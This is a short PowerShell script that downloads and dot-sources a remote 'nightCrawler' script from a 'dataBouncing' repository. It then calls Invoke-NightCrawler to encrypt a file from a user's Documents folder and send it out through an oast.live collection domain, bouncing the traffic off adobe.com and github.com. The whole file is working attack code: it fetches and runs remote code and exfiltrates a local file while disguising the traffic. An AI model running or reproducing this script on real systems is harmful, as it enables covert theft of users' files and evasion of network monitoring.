# Define variables
$scriptUrl  = 'https://raw.githubusercontent.com/Unit-259/dataBouncing/main/nightCrawler.ps1'
$localPath  = Join-Path $env:TEMP 'nightCrawler.ps1'

# Download the script file
Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -OutFile $localPath

# Dot-source the downloaded script to import its functions
. $localPath

Invoke-NightCrawler -Identifier "Req1" -Domain "d1ine12mq2v1dv57t1jgcxrw18n1pttme.oast.live" -Urls "adobe.com","github.com" -FilePath "C:\Users\ENBD_USER\Documents\Normal.txt" -EncryptionEnabled -EncryptionKey "Encryption@123"
